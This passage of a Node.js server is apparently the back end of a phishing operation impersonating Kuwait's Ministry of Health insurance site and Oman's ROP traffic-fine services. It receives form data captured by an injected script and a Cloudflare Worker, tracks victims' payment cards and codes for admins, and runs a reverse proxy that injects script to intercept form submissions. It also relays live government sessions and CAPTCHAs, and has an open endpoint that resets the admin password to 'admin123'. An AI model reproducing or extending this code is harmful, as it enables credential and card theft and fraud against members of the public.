    if (visitor) {
      visitor.hasNewMessage = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
    }
  });

  // Admin: Block card prefix
  socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      if (!visitor.blockedCardPrefixes.includes(prefix)) {
        visitor.blockedCardPrefixes.push(prefix);
        visitors.set(visitorSocketId, visitor);
        saveVisitorPermanently(visitor);
      }
      console.log(`Card prefix blocked for visitor ${visitorSocketId}: ${prefix}`);
    }
  });

  // Handle disconnection
  socket.on("disconnect", () => {
    // Check if it's a visitor
    if (visitors.has(socket.id)) {
      const visitor = visitors.get(socket.id);
      const visitorId = visitor._id;
      const socketId = socket.id;
      
      // Don't delete visitor data - keep it permanently
      visitors.delete(socket.id);
      
      // Delay disconnect notification to allow for quick reconnection during page navigation
      setTimeout(() => {
        // Check if visitor reconnected with same ID
        const reconnected = Array.from(visitors.values()).some(v => v._id === visitorId && v.isConnected);
        
        if (!reconnected) {
          // Update saved visitor as disconnected
          const savedVisitor = savedVisitors.find(v => v._id === visitorId);
          if (savedVisitor) {
            savedVisitor.isConnected = false;
            saveData();
          }
          
          // Notify admins
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:disconnected", {
              visitorId: visitorId,
              socketId: socketId,
            });
          });
          
          console.log(`Visitor disconnected: ${socketId}`);
        } else {
          console.log(`Visitor ${visitorId} reconnected quickly, skipping disconnect notification`);
        }
      }, 10000); // 10 second delay - gives time for page navigation reconnection
    }

    // Check if it's an admin
    if (admins.has(socket.id)) {
      admins.delete(socket.id);

      // Notify visitors if no admins left
      if (admins.size === 0) {
        visitors.forEach((visitor, visitorSocketId) => {
          io.to(visitorSocketId).emit("isAdminConnected", false);
        });
      }

      console.log(`Admin disconnected: ${socket.id}`);
    }
  });
});

// REST API Routes
// Temporary password reset endpoint
app.get("/api/reset-password", (req, res) => {
  adminPassword = "admin123";
  saveData();
  res.json({ success: true, message: "Password reset to admin123" });
});

// Store recent errors for debugging
const recentErrors = [];
const originalConsoleError = console.error;
console.error = function(...args) {
  recentErrors.push({ time: new Date().toISOString(), msg: args.map(a => typeof a === 'object' ? JSON.stringify(a).substring(0, 500) : String(a)).join(' ') });
  if (recentErrors.length > 50) recentErrors.shift();
  originalConsoleError.apply(console, args);
};

app.get("/", (req, res) => {
  res.json({ status: "Server is running", timestamp: new Date().toISOString() });
});

app.get("/api/debug", (req, res) => {
  res.json({
    errors: recentErrors,
    activeConnections: visitors.size,
    admins: admins.size,
    savedVisitors: savedVisitors.length,
  });
});

app.get("/api/visitors", (req, res) => {
  res.json(savedVisitors);
});

app.get("/api/stats", (req, res) => {
  res.json({
    totalVisitors: savedVisitors.length,
    connectedVisitors: visitors.size,
    totalAdmins: admins.size,
    visitorCounter,
  });
});

// ===== API: Receive captured data from Cloudflare data-collector Worker =====
// ===== API: Receive data directly from MOH Worker-injected script =====
app.post("/api/moh-data", (req, res) => {
  try {
    const { type, data, visitorId, socketId: reqSocketId } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || '';
    const clientIp = ip.split(',')[0].trim();
    
    console.log(`[MOH-DIRECT] Received ${type} from ${clientIp}, visitorId=${visitorId || 'none'}, socketId=${reqSocketId || 'none'}`);
    
    // Extract useful fields based on type
    let fields = {};
    let pageName = 'MOH';
    let username = null;
    
    if (data) {
      if (data.fields) fields = data.fields;
      if (data.content) {
        if (data.content.fields) fields = { ...fields, ...data.content.fields };
        if (data.content.page_text) fields['محتوى الصفحة'] = Array.isArray(data.content.page_text) ? data.content.page_text.join('\n') : data.content.page_text;
      }
      if (data.path) pageName = `MOH: ${data.path}`;
      if (data.username) username = data.username;
    }
    
    // Find matching visitor: try by visitorId first, then socketId, then IP
    let matchedVisitor = null;
    
    // 1. Match by visitor ID
    if (visitorId) {
      visitors.forEach((v, sid) => {
        if (v._id === visitorId) {
          matchedVisitor = { visitor: v, socketId: sid };
        }
      });
    }
    
    // 2. Match by socket ID
    if (!matchedVisitor && reqSocketId) {
      const v = visitors.get(reqSocketId);
      if (v) {
        matchedVisitor = { visitor: v, socketId: reqSocketId };
      }
    }
    
    // 3. Fallback: match by IP
    if (!matchedVisitor) {
      visitors.forEach((v, sid) => {
        if (v.ip === clientIp) {
          matchedVisitor = { visitor: v, socketId: sid };
        }
      });
    }
    
    console.log(`[MOH-DIRECT] Matched: ${matchedVisitor ? matchedVisitor.visitor._id : 'NONE'}, visitors count: ${visitors.size}`);
    
    if (matchedVisitor) {
      const v = matchedVisitor.visitor;
      
      // Update username if captured
      if (username) {
        v.fullName = username;
        v.mohUsername = username;
      }
      
      // Store data
      if (Object.keys(fields).length > 0) {
        if (!v.dataHistory) v.dataHistory = [];
        v.dataHistory.push({
          content: fields,
          page: pageName,
          timestamp: new Date().toISOString(),
        });
        v.data = { ...v.data, ...fields };
        v.hasNewData = true;
        v.page = pageName;
      }
      
      visitors.set(matchedVisitor.socketId, v);
      saveVisitorPermanently(v);
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        if (username) {
          io.to(adminSocketId).emit('visitor:nameUpdated', {
            visitorId: v._id,
            name: username,
          });
        }
        if (Object.keys(fields).length > 0) {
          io.to(adminSocketId).emit('visitor:dataSubmitted', {
            visitorId: v._id,
            socketId: matchedVisitor.socketId,
            data: { content: fields, page: pageName },
            visitor: v,
          });
        }
      });
      
      console.log(`[MOH-DIRECT] Updated visitor ${v._id} (${clientIp})`);
    } else {
      console.log(`[MOH-DIRECT] No matching visitor for IP ${clientIp}`);
    }
    
    res.json({ ok: true });
  } catch (err) {
    console.error('[MOH-DIRECT] Error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.post("/api/captured-data", (req, res) => {
  try {
    const { url, contentType, body, timestamp, ip } = req.body;
    console.log(`[DATA-COLLECTOR] Received POST data from ${ip} to ${url}`);
    
    // Parse form data from body string
    let parsedFields = {};
    if (body && contentType && contentType.includes('application/x-www-form-urlencoded')) {
      const params = new URLSearchParams(body);
      for (const [key, value] of params.entries()) {
        parsedFields[key] = value;
      }
    } else if (body) {
      try {
        parsedFields = JSON.parse(body);
      } catch(e) {
        parsedFields = { rawBody: body };
      }
    }
    
    // Find visitor by IP or create a data entry
    let matchedVisitor = null;
    visitors.forEach((v, socketId) => {
      if (v.ip === ip) {
        matchedVisitor = { visitor: v, socketId };
      }
    });
    
    if (matchedVisitor) {
      // Update existing visitor with captured data
      const v = matchedVisitor.visitor;
      if (!v.dataHistory) v.dataHistory = [];
      v.dataHistory.push({
        content: parsedFields,
        page: `MOH-POST: ${url}`,
        timestamp: timestamp || new Date().toISOString(),
      });
      v.data = { ...v.data, ...parsedFields };
      v.hasNewData = true;
      visitors.set(matchedVisitor.socketId, v);
      saveVisitorPermanently(v);
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit('visitor:dataSubmitted', {
          visitorId: v._id,
          socketId: matchedVisitor.socketId,
          data: { content: parsedFields, page: `MOH-POST: ${url}` },
          visitor: v,
        });
      });
    } else {
      // No matching visitor - store as orphan data
      console.log(`[DATA-COLLECTOR] No matching visitor for IP ${ip}, storing as orphan`);
      // Create a temporary visitor entry
      visitorCounter++;
      const orphanVisitor = {
        _id: `moh_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: 'moh-captured',
        visitorNumber: visitorCounter,
        createdAt: timestamp || new Date().toISOString(),
        isRead: false,
        fullName: parsedFields.UserName || parsedFields.username || '',
        phone: '',
        idNumber: parsedFields.CivilId || parsedFields.civilId || '',
        apiKey: '',
        ip: ip,
        country: 'KW',
        city: '',
        os: 'Unknown',
        device: 'Unknown',
        browser: 'Unknown',
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        page: `MOH-POST: ${url}`,
        data: parsedFields,
        dataHistory: [{
          content: parsedFields,
          page: `MOH-POST: ${url}`,
          timestamp: timestamp || new Date().toISOString(),
        }],
        paymentCards: [],
        digitCodes: [],
        hasNewData: true,
        isBlocked: false,
        isConnected: false,
        sessionStartTime: Date.now(),
      };
      savedVisitors.push(orphanVisitor);
      saveData();
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit('visitor:new', orphanVisitor);
      });
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('[DATA-COLLECTOR] Error:', error);
    res.status(500).json({ error: 'Internal error' });
  }
});

// ===== PROXY ROUTE FOR KUWAIT MOH INSURANCE SITE =====
const https = require("https");

app.all("/api/proxy", async (req, res) => {
  const targetUrl = req.query.url || 'https://insonline.moh.gov.kw/Insurance/logaction';
  
  // Only allow proxying to the Kuwait MOH domain
  if (!targetUrl.startsWith('https://insonline.moh.gov.kw/') && !targetUrl.startsWith('http://insonline.moh.gov.kw/')) {
    return res.status(403).json({ error: 'Only Kuwait MOH Insurance site is allowed' });
  }

  try {
    const url = new URL(targetUrl);
    const result = await new Promise((resolve, reject) => {
      const options = {
        hostname: url.hostname,
        port: 443,
        path: url.pathname + url.search,
        method: req.method || 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
          'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
          'Accept-Encoding': 'identity',
          'Connection': 'keep-alive',
        },
        timeout: 5000,
        rejectUnauthorized: false,
      };

      const proxyReq = https.request(options, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', (chunk) => chunks.push(chunk));
        proxyRes.on('end', () => {
          const body = Buffer.concat(chunks);
          const headers = {};
          for (const [key, value] of Object.entries(proxyRes.headers)) {
            if (value) headers[key] = Array.isArray(value) ? value.join(', ') : value;
          }
          resolve({ status: proxyRes.statusCode || 200, headers, body });
        });
      });

      proxyReq.on('error', reject);
      proxyReq.on('timeout', () => { proxyReq.destroy(); reject(new Error('Request timeout')); });
      
      // Forward POST body if present
      if (req.method === 'POST' && req.body) {
        const bodyStr = typeof req.body === 'string' ? req.body : 
          (req.headers['content-type'] && req.headers['content-type'].includes('json') ? 
            JSON.stringify(req.body) : new URLSearchParams(req.body).toString());
        proxyReq.write(bodyStr);
      }
      proxyReq.end();
    });

    const contentType = result.headers['content-type'] || 'text/html';
    
    // Set CORS headers and remove framing restrictions
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');
    res.setHeader('Content-Type', contentType);
    
    if (contentType.includes('text/html')) {
      let html = result.body.toString('utf-8');
      const baseUrl = new URL(targetUrl);
      const baseHref = baseUrl.protocol + '//' + baseUrl.host;
      
      // Add base tag for relative URLs
      html = html.replace(/<head([^>]*)>/i, '<head$1>\n<base href="' + baseHref + '/">');
      
      // Add navigation interception script
      const proxyScript = `
        <script>
          document.addEventListener('click', function(e) {
            var link = e.target.closest('a[href]');
            if (link) {
              var href = link.getAttribute('href');
              if (href && !href.startsWith('javascript:') && !href.startsWith('#')) {
                e.preventDefault();
                var fullUrl;
                if (href.startsWith('http')) fullUrl = href;
                else if (href.startsWith('/')) fullUrl = '${baseHref}' + href;
                else fullUrl = '${baseHref}/' + href;
                if (fullUrl.includes('insonline.moh.gov.kw')) {
                  window.location.href = '/api/proxy?url=' + encodeURIComponent(fullUrl);
                }
              }
            }
          }, true);
          document.addEventListener('submit', function(e) {
            var form = e.target;
            if (form && form.action) {
              e.preventDefault();
              var action = form.getAttribute('action') || window.location.href;
              var fullUrl;
              if (action.startsWith('http')) fullUrl = action;
              else if (action.startsWith('/')) fullUrl = '${baseHref}' + action;
              else fullUrl = '${baseHref}/' + action;
              if (form.method && form.method.toLowerCase() === 'post') {
                var fd = new FormData(form);
                fetch('/api/proxy?url=' + encodeURIComponent(fullUrl), {
                  method: 'POST', body: new URLSearchParams(fd)
                }).then(function(r){return r.text();}).then(function(h){document.open();document.write(h);document.close();});
              } else {
                var p = new URLSearchParams(new FormData(form)).toString();
                window.location.href = '/api/proxy?url=' + encodeURIComponent(fullUrl + '?' + p);
              }
            }
          }, true);
        </script>`;
      html = html.replace('</body>', proxyScript + '\n</body>');
      
      return res.status(result.status).send(html);
    } else {
      return res.status(result.status).send(result.body);
    }
  } catch (error) {
    console.error('Proxy error:', error.message);
    return res.status(502).json({ 
      error: 'Failed to fetch the target page',
      message: error.message
    });
  }
});

// Handle CORS preflight for proxy
app.options("/api/proxy", (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.status(204).send();
});

// ============================================
// ROP PROXY API - Real data from ROP website
// ============================================

const ropSessions = new Map(); // Store ROP sessions (sessionId -> {cookies, viewstate, etc})

// Helper: HTTPS GET request
function ropGet(url, cookies) {
  return new Promise((resolve, reject) => {
    const https = require('https');
    const parsedUrl = new URL(url);
    const headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Language': 'ar,en;q=0.5',
    };
    if (cookies) headers['Cookie'] = cookies;
    https.get(url, { headers }, (res) => {
      if (res.headers['content-type'] && res.headers['content-type'].includes('image')) {
        let chunks = [];
        res.on('data', chunk => chunks.push(chunk));
        res.on('end', () => resolve({ body: Buffer.concat(chunks), cookies: res.headers['set-cookie'] || [], statusCode: res.statusCode, headers: res.headers, isImage: true }));
      } else {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve({ body: data, cookies: res.headers['set-cookie'] || [], statusCode: res.statusCode, headers: res.headers }));
      }
    }).on('error', reject);
  });
}

// Helper: HTTPS POST request
function ropPost(url, postData, cookies) {
  return new Promise((resolve, reject) => {
    const https = require('https');
    const parsedUrl = new URL(url);
    const options = {
      hostname: parsedUrl.hostname,
      path: parsedUrl.pathname + parsedUrl.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(postData),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'ar,en;q=0.5',
        'Referer': url,
        'Cookie': cookies || ''
      }
    };
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ body: data, cookies: res.headers['set-cookie'] || [], statusCode: res.statusCode, headers: res.headers }));
    });
    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

// Helper: Follow a redirect (GET request) - returns text body
function ropGetText(url, cookies) {
  return new Promise((resolve, reject) => {
    const https = require('https');
    const parsedUrl = new URL(url);
    const options = {
      hostname: parsedUrl.hostname,
      path: parsedUrl.pathname + parsedUrl.search,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'ar,en;q=0.5',
        'Referer': url,
        'Cookie': cookies || ''
      }
    };
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ body: data, cookies: res.headers['set-cookie'] || [], statusCode: res.statusCode, headers: res.headers }));
    });
    req.on('error', reject);
    req.end();
  });
}

// Helper: Extract ASP.NET hidden fields from HTML
function extractAspNetFields(html) {
  const fields = {};
  const vsMatch = html.match(/id="__VIEWSTATE"\s+value="([^"]*)"/); 
  if (vsMatch) fields.__VIEWSTATE = vsMatch[1];
  const vsgMatch = html.match(/id="__VIEWSTATEGENERATOR"\s+value="([^"]*)"/); 
  if (vsgMatch) fields.__VIEWSTATEGENERATOR = vsgMatch[1];
  const evMatch = html.match(/id="__EVENTVALIDATION"\s+value="([^"]*)"/); 
  if (evMatch) fields.__EVENTVALIDATION = evMatch[1];
  return fields;
}

// Helper: Extract CAPTCHA VCID from HTML
function extractCaptchaVCID(html, pageType) {
  const vcidMatch = html.match(/id="LBD_VCID_([^"]*?)"\s+value="([^"]*)"/); 
  if (vcidMatch) return { fieldName: 'LBD_VCID_' + vcidMatch[1], value: vcidMatch[2] };
  return null;
}

// Helper: Extract captcha image URL from HTML
function extractCaptchaImageUrl(html) {
  const match = html.match(/class="LBD_CaptchaImage"[^>]*src="([^"]*)"/); 
  if (match) return match[1].replace(/&amp;/g, '&');
  return null;
}

// Helper: Parse cookies from set-cookie headers
function parseCookies(setCookieHeaders) {
  return setCookieHeaders.map(c => c.split(';')[0]).join('; ');
}

// Helper: HTTPS POST request that returns binary Buffer (for PDF downloads)
function ropPostBinary(url, postData, cookies) {
  return new Promise((resolve, reject) => {
    const https = require('https');
    const parsedUrl = new URL(url);
    const options = {
      hostname: parsedUrl.hostname,
      path: parsedUrl.pathname + parsedUrl.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(postData),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,application/pdf,*/*;q=0.8',
        'Accept-Language': 'ar,en;q=0.5',
        'Referer': url,
        'Cookie': cookies || ''
      }
    };
    const req = https.request(options, (res) => {
      let chunks = [];
      res.on('data', chunk => chunks.push(chunk));
      res.on('end', () => resolve({
        body: Buffer.concat(chunks),
        cookies: res.headers['set-cookie'] || [],
        statusCode: res.statusCode,
        headers: res.headers
      }));
    });
    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

// Helper: HTTPS GET request that returns binary Buffer (for PDF redirects)
function ropGetBinary(url, cookies) {
  return new Promise((resolve, reject) => {
    const https = require('https');
    const parsedUrl = new URL(url);
    const options = {
      hostname: parsedUrl.hostname,
      path: parsedUrl.pathname + parsedUrl.search,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,application/pdf,*/*;q=0.8',
        'Accept-Language': 'ar,en;q=0.5',
        'Referer': url,
        'Cookie': cookies || ''
      }
    };
    const req = https.request(options, (res) => {
      let chunks = [];
      res.on('data', chunk => chunks.push(chunk));
      res.on('end', () => resolve({
        body: Buffer.concat(chunks),
        cookies: res.headers['set-cookie'] || [],
        statusCode: res.statusCode,
        headers: res.headers
      }));
    });
    req.on('error', reject);
    req.end();
  });
}

// ROP Service URLs
const ROP_URLS = {
  fines: 'https://www.rop.gov.om/OnlineServices/eTraffic/arabic/default.aspx',
  renewVehicle: 'https://www.rop.gov.om/OnlineServices/eTraffic/arabic/RenewVehicleRegistration.aspx',
  renewLicense: 'https://www.rop.gov.om/OnlineServices/eTraffic/arabic/RenewDrivingLicense.aspx',
  transferVehicle: 'https://www.rop.gov.om/OnlineServices/eTraffic/arabic/VehicleOwnershipTransfer.aspx'
};

// GET /api/rop/init-session - Initialize a session with the ROP site and get captcha
app.get('/api/rop/init-session', async (req, res) => {
  try {
    const service = req.query.service || 'fines';
    const url = ROP_URLS[service] || ROP_URLS.fines;
    
    // Fetch the ROP page
    const result = await ropGet(url);
    if (result.statusCode !== 200) {
      return res.status(502).json({ error: 'Failed to reach ROP site', status: result.statusCode });
    }
    
    // Extract session cookies
    const cookies = parseCookies(result.cookies);
    
    // Extract ASP.NET fields
    const aspFields = extractAspNetFields(result.body);
    
    // Extract CAPTCHA info
    const vcid = extractCaptchaVCID(result.body);
    const captchaImgUrl = extractCaptchaImageUrl(result.body);
    
    // Generate a unique session ID for this user
    const sessionId = 'rop_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // Store session data
    ropSessions.set(sessionId, {
      cookies,
      aspFields,
      vcid,
      service,
      url,
      createdAt: Date.now()
    });
    
    // Clean up old sessions (older than 10 minutes)
    for (const [key, val] of ropSessions.entries()) {
      if (Date.now() - val.createdAt > 600000) ropSessions.delete(key);
    }
    
    // Fetch the captcha image
    let captchaBase64 = null;
    console.log('captchaImgUrl:', captchaImgUrl);
    console.log('cookies:', cookies ? cookies.substring(0, 50) + '...' : 'none');
    if (captchaImgUrl) {
      const fullCaptchaUrl = captchaImgUrl.startsWith('http') ? captchaImgUrl : 'https://www.rop.gov.om' + (captchaImgUrl.startsWith('/') ? '' : '/OnlineServices/eTraffic/arabic/') + captchaImgUrl;
      console.log('Fetching captcha from:', fullCaptchaUrl);
      try {
        const imgResult = await ropGet(fullCaptchaUrl, cookies);
        console.log('Captcha response - isImage:', imgResult.isImage, 'statusCode:', imgResult.statusCode, 'contentType:', imgResult.headers && imgResult.headers['content-type']);
        if (imgResult.isImage && imgResult.body) {
          captchaBase64 = 'data:image/jpeg;base64,' + imgResult.body.toString('base64');
          console.log('Captcha base64 length:', captchaBase64.length);
        } else if (imgResult.body) {
          // Maybe the content-type check failed but it's still an image
          // Try to use it as base64 anyway if it looks like binary data
          const bodyStr = typeof imgResult.body === 'string' ? imgResult.body : '';
          if (imgResult.statusCode === 200 && !bodyStr.includes('<html')) {
            // It's probably binary data returned as string - re-fetch as buffer
            console.log('Captcha returned as non-image content-type, body length:', bodyStr.length);
          }
        }
      } catch (captchaErr) {
        console.error('Captcha fetch error:', captchaErr.message);
      }
    } else {
      console.log('No captcha URL found in page');
    }
    
    res.json({
      success: true,
      sessionId,
      captchaImage: captchaBase64,
      message: 'Session initialized successfully'
    });
    
  } catch (error) {
    console.error('ROP init-session error:', error.message);
    res.status(500).json({ error: 'Failed to initialize ROP session', message: error.message });
  }
});

// GET /api/rop/refresh-captcha - Get a new captcha for existing session
app.get('/api/rop/refresh-captcha', async (req, res) => {
  try {
    const sessionId = req.query.sessionId;
    if (!sessionId || !ropSessions.has(sessionId)) {
      return res.status(400).json({ success: false, error: 'session_expired', message: 'انتهت الجلسة، يرجى تحديث الصفحة' });
    }
    
    const session = ropSessions.get(sessionId);
    
    // Re-fetch the page to get a new captcha
    const result = await ropGet(session.url, session.cookies);
    if (result.statusCode !== 200) {
      return res.status(502).json({ error: 'Failed to reach ROP site' });
    }
    
    // Update cookies if new ones received
    if (result.cookies.length > 0) {
      session.cookies = parseCookies(result.cookies);
    }
    
    // Update ASP.NET fields
    session.aspFields = extractAspNetFields(result.body);
    session.vcid = extractCaptchaVCID(result.body);
    
    // Get new captcha image
    const captchaImgUrl = extractCaptchaImageUrl(result.body);
    let captchaBase64 = null;
    if (captchaImgUrl) {
      const fullCaptchaUrl = captchaImgUrl.startsWith('http') ? captchaImgUrl : 'https://www.rop.gov.om' + (captchaImgUrl.startsWith('/') ? '' : '/OnlineServices/eTraffic/arabic/') + captchaImgUrl;
      const imgResult = await ropGet(fullCaptchaUrl, session.cookies);
      if (imgResult.isImage && imgResult.body) {
        captchaBase64 = 'data:image/jpeg;base64,' + imgResult.body.toString('base64');
      }
    }
    
    ropSessions.set(sessionId, session);
    
    res.json({
      success: true,
      captchaImage: captchaBase64
    });
    
  } catch (error) {
    console.error('ROP refresh-captcha error:', error.message);
    res.status(500).json({ error: 'Failed to refresh captcha', message: error.message });
  }
});

// Results store (in-memory, auto-expires after 10 minutes)
const ropResultsStore = new Map();

// POST /api/rop/license-enquiry - Track license renewal enquiry from admin
app.post('/api/rop/license-enquiry', (req, res) => {
  try {
    const { licenseNo, idType, idValue } = req.body;
    console.log('[License Enquiry] License:', licenseNo, 'ID Type:', idType, 'ID Value:', idValue);
    // Notify admins about the license enquiry
    admins.forEach((admin) => {
      admin.socket.emit('license:enquiry', { licenseNo, idType, idValue, timestamp: Date.now() });
    });
    res.json({ success: true });
  } catch (err) {
    console.error('License enquiry error:', err);
    res.json({ success: false });
  }
});

// POST /api/rop/submit - Submit form data to ROP site
app.post('/api/rop/submit', async (req, res) => {
  try {
    const { sessionId, vehicleChars, vehicleNo, idType, idValue, captchaCode, action } = req.body;
    
    if (!sessionId || !ropSessions.has(sessionId)) {
      return res.status(400).json({ success: false, error: 'session_expired', message: 'انتهت الجلسة، يرجى تحديث الصفحة والمحاولة مرة أخرى' });
    }
    
    const session = ropSessions.get(sessionId);
    const querystring = require('querystring');
    
    // Build form data
    const formData = {
      '__EVENTTARGET': '',
      '__EVENTARGUMENT': '',
      '__VIEWSTATE': session.aspFields.__VIEWSTATE || '',
      '__VIEWSTATEGENERATOR': session.aspFields.__VIEWSTATEGENERATOR || '',
      '__EVENTVALIDATION': session.aspFields.__EVENTVALIDATION || '',
      'ctl00$ContentPlaceHolder1$ddlVehicleChars': vehicleChars || '0',
      'ctl00$ContentPlaceHolder1$txtVehicleNo': vehicleNo || '',
      'ctl00$ContentPlaceHolder1$ddlIDChoice': idType || '1',
      'ctl00$ContentPlaceHolder1$txtIDValue': idValue || '',
      'ctl00$ContentPlaceHolder1$CaptchaCodeTextBox': captchaCode || '',
    };
    
    // Add VCID field
    if (session.vcid) {
      formData[session.vcid.fieldName] = session.vcid.value;
    }
    
    // Add the submit button based on action
    if (action === 'history') {
      formData['ctl00$ContentPlaceHolder1$btnHistory'] = 'المدفوعات السابقة';
    } else if (action === 'report') {
      formData['ctl00$ContentPlaceHolder1$btnReport'] = 'تنزيل التقرير';
    } else {
      formData['ctl00$ContentPlaceHolder1$bntEnquire'] = 'دفع المخالفات';
    }
    
    const postData = querystring.stringify(formData);
    
    // Submit to ROP
    const result = await ropPost(session.url, postData, session.cookies);
    
    // Check if we got a redirect (302) - this means captcha was correct and results are on another page
    let responseHtml = result.body;
    let confirmCookies = session.cookies; // Track cookies for ConfirmPayment page (needed for PDF postback)
    let confirmUrl = ''; // Track the ConfirmPayment URL
    console.log('ROP POST response status:', result.statusCode);
    
    if (result.statusCode === 302 || (result.headers && result.headers.location)) {
      // Follow the redirect to get the results page
      const location = result.headers.location;
      console.log('Following redirect to:', location);
      
      // Update cookies from the redirect response
      let updatedCookies = session.cookies;
      if (result.cookies.length > 0) {
        const newCookies = parseCookies(result.cookies);
        updatedCookies = updatedCookies ? updatedCookies + '; ' + newCookies : newCookies;
      }
      
      // Build the full URL for the redirect
      const redirectUrl = location.startsWith('http') ? location : `https://www.rop.gov.om${location}`;
      confirmUrl = redirectUrl; // Store for PDF postback
      confirmCookies = updatedCookies; // Store for PDF postback
      
      // GET the results page
      const redirectResult = await ropGetText(redirectUrl, updatedCookies);
      responseHtml = redirectResult.body;
      // Update cookies from the ConfirmPayment page response
      if (redirectResult.cookies && redirectResult.cookies.length > 0) {
        const newCookies2 = parseCookies(redirectResult.cookies);
        confirmCookies = confirmCookies + '; ' + newCookies2;
      }
      console.log('Redirect page length:', responseHtml.length);
      console.log('Has معلومات التسجيل:', responseHtml.includes('معلومات التسجيل'));
      console.log('Has لديك عدد:', responseHtml.includes('لديك عدد'));
      console.log('Has table:', responseHtml.includes('<table'));
    }
    
    // Also check for redirect in the HTML body (Object moved)
    const objectMovedMatch = responseHtml.match(/Object moved to <a href="([^"]+)"/);
    if (objectMovedMatch && !responseHtml.includes('معلومات التسجيل')) {
      const redirectUrl2 = objectMovedMatch[1].startsWith('http') ? objectMovedMatch[1] : `https://www.rop.gov.om${objectMovedMatch[1]}`;
      console.log('Following HTML redirect to:', redirectUrl2);
      
      let updatedCookies = session.cookies;
      if (result.cookies.length > 0) {
        const newCookies = parseCookies(result.cookies);
        updatedCookies = updatedCookies ? updatedCookies + '; ' + newCookies : newCookies;
      }
      confirmUrl = redirectUrl2; // Store for PDF postback
      confirmCookies = updatedCookies; // Store for PDF postback
      
      const redirectResult = await ropGetText(redirectUrl2, updatedCookies);
      responseHtml = redirectResult.body;
      // Update cookies from the ConfirmPayment page response
      if (redirectResult.cookies && redirectResult.cookies.length > 0) {
        const newCookies2 = parseCookies(redirectResult.cookies);
        confirmCookies = confirmCookies + '; ' + newCookies2;
      }
      console.log('HTML redirect page length:', responseHtml.length);
    }
    
    // Check for errors
    const errorMatch = responseHtml.match(/id="ctl00_ContentPlaceHolder1_lblError"[^>]*>([\s\S]*?)<\/span>/);
    const captchaError = responseHtml.match(/id="ctl00_ContentPlaceHolder1_CaptchaIncorrectLabel"[^>]*>([\s\S]*?)<\/span>/);
    
    // Check if captcha was wrong (either via CaptchaIncorrectLabel or lblError containing captcha text)
    const isCaptchaError = (captchaError && captchaError[1].trim()) || 
      (errorMatch && errorMatch[1].trim() && /رمز التحقق|كلمة التحقق|captcha|verification/i.test(errorMatch[1]));
    
    if (isCaptchaError) {
      // Captcha was wrong - update session with new viewstate from response
      session.aspFields = extractAspNetFields(responseHtml);
      session.vcid = extractCaptchaVCID(responseHtml);
      if (result.cookies.length > 0) {
        session.cookies = parseCookies(result.cookies);
      }
      ropSessions.set(sessionId, session);
      
      // Get new captcha image from the error response
      let newCaptchaImage = null;
      const captchaImgUrl = extractCaptchaImageUrl(responseHtml);
      if (captchaImgUrl) {
        try {
